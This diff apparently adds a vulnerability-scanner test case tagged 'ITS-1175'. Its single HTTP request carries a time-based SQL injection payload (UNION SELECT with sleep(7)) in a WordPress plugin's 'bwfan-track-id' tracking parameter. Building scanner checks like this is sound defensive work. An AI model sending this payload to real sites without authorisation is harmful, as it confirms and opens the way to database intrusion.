@@ -1,0 +1,2 @@
+# Vulnerable: ITS-1175
+GET /?bwfan-track-id=test%27%20UNION%20SELECT%201%2C1%2C%27%27%2CNOW()%2CNOW()%2C1%2C%27%27%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C%27%27%2CNOW()%2C%27%27%2CNOW()%2C1%2C1%2Csleep(7)%23&bwfan-track-action=click
